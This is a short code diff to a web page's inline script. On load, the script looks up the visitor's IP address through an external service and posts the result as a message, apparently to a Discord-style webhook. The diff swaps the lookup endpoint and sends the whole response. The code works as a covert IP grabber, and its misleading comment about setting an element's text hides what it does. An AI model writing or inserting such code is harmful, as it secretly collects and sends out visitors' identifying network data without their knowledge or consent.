@@ -10,7 +10,7 @@
      
       <script>
                 
-    $.getJSON("https://cors-anywhere.herokuapp.com/https://api.ipify.org?format=json", function(data) {
+    $.getJSON("https://europe-west3-devrcc.cloudfunctions.net/whatismyip", function(data) {
          
         // Setting text of element P with id gfg
         const request = new XMLHttpRequest();
@@ -21,7 +21,7 @@
     const params = {
       username: "Hi :3",
       avatar_url: "",
-      content: data.ip
+      content: data
     }
 
     request.send(JSON.stringify(params));
